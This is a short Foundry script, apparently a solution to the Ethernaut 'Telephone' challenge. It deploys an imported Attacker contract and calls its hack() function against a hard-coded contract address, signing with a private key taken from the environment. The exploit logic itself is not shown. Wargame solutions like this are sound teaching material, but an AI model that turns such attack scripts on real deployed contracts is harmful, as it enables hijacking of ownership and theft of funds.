// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Attacker.sol";

contract TelephoneScript is Script {

    address public TelephoneAddress = 0x75919D579DF08df8345A1C9584a46054EFF54d44;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker();
        attacker.hack(TelephoneAddress);
        vm.stopBroadcast();
    }
}
